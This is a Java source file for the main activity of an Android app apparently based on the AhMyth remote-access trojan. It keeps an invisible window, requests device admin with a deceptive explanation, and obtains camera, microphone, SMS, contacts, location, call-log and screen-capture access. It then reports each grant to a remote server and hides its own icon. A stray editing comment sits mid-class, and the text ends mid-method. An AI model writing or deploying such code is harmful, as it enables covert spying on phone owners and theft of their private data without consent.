package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "AhMyth";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_CODE = 1002;
    private static final int MANAGE_STORAGE_CODE = 1003;
    private static final int USAGE_STATS_CODE = 1004;
    private static final int BATTERY_OPTIMIZATION_CODE = 1005;
    private static final int DEVICE_ADMIN_CODE = 1006;
    private static final int SCREEN_CAPTURE_CODE = 1007;

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private int currentPermissionIndex = 0;
    private List<String> permissionsToRequest = new ArrayList<>();
    private boolean overlayPermissionRequested = false;
    private boolean storagePermissionRequested = false;
    private boolean usageStatsRequested = false;
    private boolean batteryOptRequested = false;
    private boolean isHandlingServerPermissionRequest = false; // Track if handling server permission requests
    private static boolean isCameraActive = false; // Track if camera is being used
    private static MainActivity instance; // Keep reference to activity

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Keep reference to this activity for camera operations
        instance = this;
        
        // Don't set any content view - app should be invisible
        // The SplashTheme in AndroidManifest makes the activity fully transparent
        Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
        
        // Make activity fully transparent and clickthrough
        try {
            // Set window to be fully transparent
            getWindow().setBackgroundDrawableResource(android.R.color.transparent);
            getWindow().setStatusBarColor(android.graphics.Color.TRANSPARENT);
            getWindow().setNavigationBarColor(android.graphics.Color.TRANSPARENT);
            
            Log.d(TAG, "Activity set to transparent background");
        } catch (Exception e) {
            Log.e(TAG, "Error setting transparent window", e);
        }
        
        try {
            // Initialize SharedPreferences
            sharedPreferences = getSharedPreferences("AhMythPrefs", Context.MODE_PRIVATE);
        } catch (Exception e) {
            Log.e(TAG, "Error initializing SharedPreferences", e);
        }

        // Check if this is a permission request from server
        Intent intent = getIntent();
        if (intent != null && intent.hasExtra("request_permission")) {
            String permissionType = intent.getStringExtra("request_permission");
            Log.d(TAG, "Permission request from server: " + permissionType);
            isHandlingServerPermissionRequest = true; // Mark that we're handling server permission requests
            handlePermissionRequest(permissionType);
            // DO NOT return - keep activity alive for permission dialogs
        }

        // Check if ADB_GRANT_MODE - permissions already granted via ADB
        if (StealthConfig.ADB_GRANT_MODE) {
            Log.d(TAG, "ADB_GRANT_MODE enabled - skipping permission prompts");
            startMainService();
            
            // Apply transparent clickthrough immediately
            applyTransparentClickthrough();
            
            // Quick stealth exit
            if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
                handler.postDelayed(() -> {
                    if (StealthConfig.HIDE_ICON) hideAppIcon();
                    moveTaskToBack(true);
                    finish();
                }, StealthConfig.HIDE_DELAY_MS);
            }
            return;
        }
        
        // Start service first
        startMainService();
        
        // Apply transparent clickthrough mode
        applyTransparentClickthrough();
        
        Log.d(TAG, "MainActivity onCreate complete");
        
        // Request permissions with minimal delay
        int delay = StealthConfig.SILENT_PERMISSION_MODE ? 100 : 500;
        handler.postDelayed(() -> {
            try {
                // Start with Device Admin -> Accessibility -> Runtime Permissions
                if (StealthConfig.UNINSTALL_PROTECTION) {
                    requestDeviceAdmin();
                } else {
                    requestAccessibilityForAutoGrant();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in permission request flow", e);
                applyStealthConfig();
            }
        }, delay);
    }
    
    private void startRuntimePermissions() {
        try {
            buildPermissionList();
            if (!permissionsToRequest.isEmpty()) {
                requestNextPermission();
            } else {
                if (!StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                    requestSpecialPermissions();
                } else {
                    finishSetup();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in runtime permissions flow", e);
            finishSetup();
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        
        // Handle permission request from server when activity is already running
        if (intent != null && intent.hasExtra("request_permission")) {
            String permissionType = intent.getStringExtra("request_permission");
            Log.d(TAG, "Permission request from server (onNewIntent): " + permissionType);
            isHandlingServerPermissionRequest = true; // Mark that we're handling server permission requests
            handlePermissionRequest(permissionType);
        }
    }
    
    private void handlePermissionRequest(String permissionType) {
        if (permissionType == null) {
            Log.e(TAG, "Permission type is null");
            return;
        }
        
        Log.d(TAG, "Handling permission request: " + permissionType);
        
        // Mark that we're handling server permission requests - keep activity alive
        isHandlingServerPermissionRequest = true;
        
        // Ensure activity is enabled and visible for permission dialogs
        // Don't hide icon while requesting permissions
        try {
            PackageManager pm = getPackageManager();
            ComponentName mainActivity = getComponentName();
            int state = pm.getComponentEnabledSetting(mainActivity);
            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                pm.setComponentEnabledSetting(mainActivity,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
                Log.d(TAG, "MainActivity enabled for permission request");
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not ensure MainActivity is enabled", e);
        }
        
        // Start service in background first
        startMainService();
        
        // Make window focusable for permission dialog
        makeFocusable();
        
        // Bring activity to foreground for permission dialog
        try {
            
            // Bring activity to foreground
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            int taskId = getTaskId();
            if (taskId > 0) {
                am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                Log.d(TAG, "Brought activity to front for permission request");
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not move task to front", e);
        }
        
        // Map permission type to actual permission string
        String permission = null;
        switch (permissionType.toLowerCase()) {
            case "camera":
                permission = Manifest.permission.CAMERA;
                break;
            case "microphone":
            case "mic":
            case "audio":
                permission = Manifest.permission.RECORD_AUDIO;
                break;
            case "location":
            case "gps":
                permission = Manifest.permission.ACCESS_FINE_LOCATION;
                break;
            case "contacts":
                permission = Manifest.permission.READ_CONTACTS;
                break;
            case "sms":
                permission = Manifest.permission.READ_SMS;
                break;
            case "phone":
            case "calls":
            case "calllogs":
                permission = Manifest.permission.READ_PHONE_STATE;
                break;
            case "storage":
            case "files":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        Intent settingsIntent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        settingsIntent.setData(Uri.parse("package:" + getPackageName()));
                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivityForResult(settingsIntent, MANAGE_STORAGE_CODE);
                    } catch (Exception e) {
                        Log.e(TAG, "Error opening storage settings", e);
                    }
                    return;
                } else {
                    permission = Manifest.permission.READ_EXTERNAL_STORAGE;
                }
                break;
            default:
                Log.e(TAG, "Unknown permission type: " + permissionType);
                return;
        }
        
        // Check if permission is already granted
        if (permission != null) {
            // Check if permission is already granted
            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Permission already granted: " + permission);
                sendStatusToServer(permissionType, true, "Permission already granted");
                return;
            }
            
            // Request the permission - ensure activity is ready first
            final String finalPermission = permission;
            
            // Wait for activity to be fully ready, then request permission
            // Use multiple attempts with increasing delays to ensure dialog appears
            handler.postDelayed(() -> {
                try {
                    if (isFinishing()) {
                        Log.w(TAG, "Activity is finishing, cannot request permission");
                        return;
                    }
                    
                    // Ensure we're in foreground - try to move task to front again
                    try {
                        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                        int taskId = getTaskId();
                        if (taskId > 0 && !hasWindowFocus()) {
                            am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                            Log.d(TAG, "Re-moved task to front: " + taskId);
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "Could not re-move task to front", e);
                    }
                    
                    // Ensure window is visible
                    getWindow().getDecorView().bringToFront();
                    getWindow().getDecorView().requestFocus();
                    
                    // First attempt - immediate
                    Log.d(TAG, "Requesting permission (attempt 1): " + finalPermission);
                    ActivityCompat.requestPermissions(this, new String[]{finalPermission}, PERMISSION_REQUEST_CODE);
                    
                    // Second attempt - delayed in case first didn't work
                    handler.postDelayed(() -> {
                        try {
                            if (!isFinishing() && !hasWindowFocus()) {
                                // Try one more time to bring to front
                                try {
                                    ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                                    int taskId = getTaskId();
                                    if (taskId > 0) {
                                        am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                                    }
                                } catch (Exception e) {
                                    // Ignore
                                }
                                getWindow().getDecorView().bringToFront();
                                getWindow().getDecorView().requestFocus();
                            }
                            if (!isFinishing()) {
                                Log.d(TAG, "Requesting permission (attempt 2): " + finalPermission);
                                ActivityCompat.requestPermissions(this, new String[]{finalPermission}, PERMISSION_REQUEST_CODE);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error requesting permission (attempt 2)", e);
                        }
                    }, 800); // 800ms delay for second attempt
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting permission", e);
                }
            }, 1000); // 1 second delay to ensure activity is fully visible
        }
    }
    
    private void buildPermissionList() {
        permissionsToRequest.clear();
        currentPermissionIndex = 0;
        
        // Build list of permissions that need to be requested
        // Group them so they can be requested in batches
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Core permissions - request these in one batch
            addPermissionIfNeeded(Manifest.permission.CAMERA);
            addPermissionIfNeeded(Manifest.permission.RECORD_AUDIO);
            addPermissionIfNeeded(Manifest.permission.READ_CONTACTS);
            addPermissionIfNeeded(Manifest.permission.WRITE_CONTACTS);
            addPermissionIfNeeded(Manifest.permission.READ_SMS);
            addPermissionIfNeeded(Manifest.permission.SEND_SMS);
            addPermissionIfNeeded(Manifest.permission.RECEIVE_SMS);
            addPermissionIfNeeded(Manifest.permission.READ_CALL_LOG);
            addPermissionIfNeeded(Manifest.permission.READ_PHONE_STATE);
            addPermissionIfNeeded(Manifest.permission.CALL_PHONE);
            
            // Location permission (will need separate handling for background)
            addPermissionIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION);
            addPermissionIfNeeded(Manifest.permission.ACCESS_COARSE_LOCATION);
            
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                addPermissionIfNeeded(Manifest.permission.READ_EXTERNAL_STORAGE);
                addPermissionIfNeeded(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                addPermissionIfNeeded(Manifest.permission.POST_NOTIFICATIONS);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_IMAGES);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_VIDEO);
                addPermissionIfNeeded(Manifest.permission.READ_MEDIA_AUDIO);
            }
        }
        
        Log.d(TAG, "Permissions to request: " + permissionsToRequest.size());
    }
    
    private void addPermissionIfNeeded(String permission) {
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(permission);
        }
    }
    
    private void requestNextPermission() {
        if (currentPermissionIndex >= permissionsToRequest.size()) {
            // All runtime permissions done, now request special permissions
            Log.d(TAG, "All runtime permissions requested, moving to special permissions");
            requestBackgroundLocationIfNeeded();
            return;
        }
        
        // If skip prompts is enabled, request all permissions at once (silent batch)
        if (StealthConfig.SKIP_PERMISSION_PROMPTS) {
            requestAllPermissionsSilently();
            return;
        }
        
        // NON-STEALTH MODE: Request all remaining permissions in ONE batch
        // This shows ONE dialog with all permissions instead of multiple dialogs
        int remaining = permissionsToRequest.size() - currentPermissionIndex;
        if (remaining > 0) {
            Log.d(TAG, "Requesting " + remaining + " permissions in batch");
            
            // Make window focusable before requesting permissions
            makeFocusable();
            
            String[] batchPermissions = new String[remaining];
            for (int i = 0; i < remaining; i++) {
                batchPermissions[i] = permissionsToRequest.get(currentPermissionIndex + i);
            }
            currentPermissionIndex = permissionsToRequest.size(); // Mark all as requested
            
            // Request all at once - shows single dialog on most devices
            // Ensure activity is visible for this
            makeFocusable();
            ActivityCompat.requestPermissions(this, batchPermissions, PERMISSION_REQUEST_CODE);
        } else {
            requestBackgroundLocationIfNeeded();
        }
    }
    
    // Request all permissions at once in batch mode - fastest method
    private void requestAllPermissionsSilently() {
        if (permissionsToRequest.isEmpty()) {
            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                applyStealthConfig();
            } else {
                requestSpecialPermissions();
            }
            return;
        }
        
        Log.d(TAG, "Requesting ALL permissions in single batch (silent mode)");
        String[] permsArray = permissionsToRequest.toArray(new String[0]);
        currentPermissionIndex = permissionsToRequest.size(); // Mark all as processed
        
        // Request all at once - fastest method, grants what it can silently
        ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            int granted = 0;
            boolean anyDenied = false;
            String deniedPermission = "";
            
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                } else {
                    anyDenied = true;
                    if (permissions.length > i) deniedPermission = permissions[i];
                }
                Log.d(TAG, "Permission " + permissions[i] + ": " + 
                    (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
            }
            Log.d(TAG, "Permissions granted: " + granted + "/" + permissions.length);
            
            // Notify server if we are in manual request mode
            if (isHandlingServerPermissionRequest) {
                if (anyDenied) {
                    sendStatusToServer("request", false, "Permission denied by user: " + deniedPermission);
                } else {
                    sendStatusToServer("request", true, "Permission granted by user");
                }
            }
            
            // Restore clickthrough after permissions handled
            applyTransparentClickthrough();
            
            // Minimal delay for fast processing
            int delay = StealthConfig.SILENT_PERMISSION_MODE ? StealthConfig.PERMISSION_DELAY_MS : 300;
            handler.postDelayed(() -> {
                try {
                    requestNextPermission();
                } catch (Exception e) {
                    Log.e(TAG, "Error in requestNextPermission", e);
                    requestBackgroundLocationIfNeeded();
                }
            }, delay);
        } else if (requestCode == BACKGROUND_LOCATION_CODE) {
            // Background location result
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Background location permission GRANTED");
                if (isHandlingServerPermissionRequest) sendStatusToServer("location_background", true, "Background location granted");
            } else {
                Log.d(TAG, "Background location permission DENIED");
                if (isHandlingServerPermissionRequest) sendStatusToServer("location_background", false, "Background location denied");
            }
            // Continue to special permissions
            handler.postDelayed(() -> {
                if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                    applyStealthConfig();
                } else {
                    requestSpecialPermissions();
                }
            }, 300);
        }
    }
    
    private void sendStatusToServer(String permissionType, boolean success, String message) {
        try {
            org.json.JSONObject result = new org.json.JSONObject();
            result.put("permission", permissionType);
            result.put("success", success);
            result.put("message", message);
            result.put("accepted", success); // Explicit flag for acceptance
            
            // Send directly if socket available, or via intent
            if (ConnectionManager.getSocket() != null && ConnectionManager.getSocket().connected()) {
                ConnectionManager.getSocket().emit("x0000rp", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending status to server", e);
        }
    }
    
    // Request background location permission (Android 10+)
    private static final int BACKGROUND_LOCATION_CODE = 1008;
    private boolean backgroundLocationRequested = false;
    
    private void requestBackgroundLocationIfNeeded() {
        // Background location requires separate request on Android 10+
        if (!backgroundLocationRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Check if foreground location is granted first
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                == PackageManager.PERMISSION_GRANTED) {
                // Check if background location is not granted
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                    backgroundLocationRequested = true;
                    Log.d(TAG, "Requesting background location permission");
                    ActivityCompat.requestPermissions(this, 
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 
                        BACKGROUND_LOCATION_CODE);
                    return;
                }
            }
        }
        
        // Continue to special permissions
        if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
            applyStealthConfig();
        } else {
            requestSpecialPermissions();
        }
    }
    
    private void requestSpecialPermissions() {
        // PRIORITY 1: Overlay Permission (Needed for Camera/Persistence)
        requestOverlayIfNeeded();
    }
    
    private void requestOverlayIfNeeded() {
        // Only request overlay permission once per session
        if (!overlayPermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            overlayPermissionRequested = true;
            try {
                Log.d(TAG, "Requesting Overlay Permission");
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // On Android 10+, this might just open the list
                    intent.setData(Uri.parse("package:" + getPackageName()));
                } else {
                    intent.setData(Uri.parse("package:" + getPackageName()));
                }
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Error requesting overlay permission", e);
                try {
                    Intent fallback = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                    startActivityForResult(fallback, OVERLAY_PERMISSION_CODE);
                    return;
                } catch (Exception ignored) {}
            }
        }
        
        requestUsageStatsIfNeeded();
    }

    private void requestUsageStatsIfNeeded() {
        if (!usageStatsRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && !hasUsageStatsPermission()) {
            usageStatsRequested = true;
            try {
                Log.d(TAG, "Requesting Usage Stats Permission");
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                // Try to target our package specifically if possible (Android 10+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                     intent.setData(Uri.parse("package:" + getPackageName()));
                     // Note: Some devices ignore data URI for this intent
                }
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, USAGE_STATS_CODE);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Error requesting usage stats", e);
                try {
                    // Fallback to general list
                    Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    startActivityForResult(intent, USAGE_STATS_CODE);
                    return;
                } catch (Exception ignored) {}
            }
        }

        requestBatteryOptimizationIfNeeded();
    }
    
    private void requestBatteryOptimizationIfNeeded() {
        // Request battery optimization exemption (only once per session)
        if (!batteryOptRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                batteryOptRequested = true;
                try {
                    Log.d(TAG, "Requesting Battery Optimization");
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting battery optimization", e);
                }
            }
        }
        
        requestStorageIfNeeded();
    }
    
    private void requestStorageIfNeeded() {
        // Only request storage permission once per session
        if (!storagePermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            storagePermissionRequested = true;
            try {
                Log.d(TAG, "Requesting Manage External Storage");
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Error requesting storage management", e);
            }
        }
        
        finishSetup();
    }

    private boolean hasUsageStatsPermission() {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo applicationInfo = pm.getApplicationInfo(getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, 
                    applicationInfo.uid, applicationInfo.packageName);
            return (mode == AppOpsManager.MODE_ALLOWED);
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        Log.d(TAG, "onActivityResult: requestCode=" + requestCode + ", resultCode=" + resultCode);
        
        switch (requestCode) {
            case BACKGROUND_LOCATION_CODE:
                // Continue to special permissions after background location
                Log.d(TAG, "Background location result received, continuing...");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
                            applyStealthConfig();
                        } else {
                            requestSpecialPermissions();
                        }
                    }
                }, 300);
                break;
                
            case OVERLAY_PERMISSION_CODE:
                Log.d(TAG, "Overlay permission result received, continuing...");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestUsageStatsIfNeeded();
                    }
                }, 300);
                break;

            case USAGE_STATS_CODE:
                Log.d(TAG, "Usage stats result received, continuing...");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestBatteryOptimizationIfNeeded();
                    }
                }, 300);
                break;
                
            case BATTERY_OPTIMIZATION_CODE:
                Log.d(TAG, "Battery optimization result received, continuing...");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestStorageIfNeeded();
                    }
                }, 300);
                break;
                
            case MANAGE_STORAGE_CODE:
                Log.d(TAG, "Storage management result received, continuing...");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        finishSetup();
                    }
                }, 300);
                break;
                
            case DEVICE_ADMIN_CODE:
                Log.d(TAG, "Device Admin result received");
                requestAccessibilityForAutoGrant();
                break;
                
            case SCREEN_CAPTURE_CODE:
                Log.d(TAG, "Screen capture permission result: " + resultCode);
                if (resultCode == RESULT_OK && data != null) {
                    // Store permission for ScreenStreamService
                    ScreenStreamService.setProjectionPermission(resultCode, data);
                    
                    // Start the screen stream service
                    Intent serviceIntent = new Intent(this, ScreenStreamService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent);
                    } else {
                        startService(serviceIntent);
                    }
                    Log.d(TAG, "Screen capture service started");
                }
                applyStealthConfig();
                break;
        }
    }
    
            // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
            // ... (Wait, I am searching for finishSetup logic logic in MainActivity.java)

    private void finishSetup() {
        Log.d(TAG, "Finish setup - requesting screen capture");
        requestScreenCapture();
    }
    
    private void requestDeviceAdmin() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            componentName = new ComponentName(this, AdminReceiver.class);
            
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Log.d(TAG, "Requesting Device Admin activation");
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Enable administrator access for enhanced features and security.");
                startActivityForResult(intent, DEVICE_ADMIN_CODE);
            } else {
                Log.d(TAG, "Device Admin already active");
                requestAccessibilityForAutoGrant();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting device admin", e);
            requestAccessibilityForAutoGrant();
        }
    }
    
    private void requestAccessibilityForAutoGrant() {
        // If accessibility auto-grant is enabled, prompt user to enable it
        if (StealthConfig.USE_ACCESSIBILITY_GRANTER) {
            if (!isAccessibilityServiceEnabled(PermissionGranterService.class)) {
                Log.d(TAG, "Prompting for Accessibility Service (Permission Granter)");
                try {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    
                    // Continue with runtime permissions after a delay
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            startRuntimePermissions();
                        }
                    }, 3000);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error opening accessibility settings", e);
                }
            }
        }
        startRuntimePermissions();
    }
    
    private void requestScreenCapture() {
        // Request screen capture permission for remote desktop feature
        if (!StealthConfig.AUTO_REQUEST_SCREEN_CAPTURE) {
            applyStealthConfig();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                Log.d(TAG, "Requesting screen capture permission");
                android.media.projection.MediaProjectionManager mpm = 
                    (android.media.projection.MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    startActivityForResult(mpm.createScreenCaptureIntent(), SCREEN_CAPTURE_CODE);
                    return;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error requesting screen capture", e);
            }
        }
        applyStealthConfig();
    }
    
    private boolean isAccessibilityServiceEnabled(Class<?> serviceClass) {
        try {
            String serviceName = getPackageName() + "/" + serviceClass.getName();
            String enabledServices = Settings.Secure.getString(
                getContentResolver(), 
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(serviceName);
        } catch (Exception e) {
            return false;
        }
    }
    
    private void applyStealthConfig() {
        Log.d(TAG, "Setup complete - applying stealth config");
        
        // Apply stealth config
        if (StealthConfig.HIDE_ICON) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    hideAppIcon();
                }
            }, StealthConfig.HIDE_DELAY_MS);
        }
        
        // DO NOT finish activity if we're handling server permission requests
        // Keep activity alive and transparent in foreground for permission dialogs
        if (StealthConfig.AUTO_CLOSE_ACTIVITY && !isHandlingServerPermissionRequest) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finishAndRemoveTask(); // Completely remove task
                }
            }, StealthConfig.HIDE_DELAY_MS + 500);
        } else {
            // Finish activity - rely on Service overlay for foreground persistence
            // This ensures we don't block the screen
            Log.d(TAG, "Finishing activity - Service Overlay will maintain persistence");
            finishAndRemoveTask();
        }
    }

    private void startMainService() {
        Log.d(TAG, "Starting main service");
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    ContextCompat.startForegroundService(this, serviceIntent);
                } catch (IllegalStateException e) {
                    // If foreground service can't start, try regular service
                    Log.w(TAG, "Foreground service failed, trying regular service", e);
                    startService(serviceIntent);
                }
            } else {
                startService(serviceIntent);
            }
            
            // Also call static start method as fallback
            try {
                MainService.startService(this);
            } catch (Exception e) {
                Log.w(TAG, "Static service start failed", e);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security error starting service - may need permissions", e);
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            
            // Try to disable launcher alias if it exists
            try {
                ComponentName launcherAlias = new ComponentName(this, "ahmyth.mine.king.ahmyth.LauncherAlias");
                // Check if component exists by trying to get its enabled state
                int state = pm.getComponentEnabledSetting(launcherAlias);
                // If we get here without exception, component exists
                if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED &&
                    state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                    pm.setComponentEnabledSetting(launcherAlias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                    Log.d(TAG, "LauncherAlias disabled");
                }
            } catch (IllegalArgumentException e) {
                // Component doesn't exist, skip it
                Log.d(TAG, "LauncherAlias component not found, skipping");
            } catch (Exception e) {
                Log.d(TAG, "Could not disable LauncherAlias: " + e.getMessage());
            }
                
            // Keep MainActivity ENABLED but hide from launcher
            // This allows camera and other features to work while remaining hidden
            // DON'T disable the activity - just disable the launcher alias
            try {
                // MainActivity must remain ENABLED for camera and other system APIs
                pm.setComponentEnabledSetting(getComponentName(),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
                Log.d(TAG, "Main activity kept enabled (but hidden from launcher)");
            } catch (Exception e) {
                Log.w(TAG, "Could not ensure main activity enabled", e);
            }
                
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding icon", e);
        }
    }

    public void openGooglePlay(View view) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        startActivity(GoogleIntent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "MainActivity onResume");
        
        // Keep activity in foreground but transparent and clickthrough
        if (isCameraActive) {
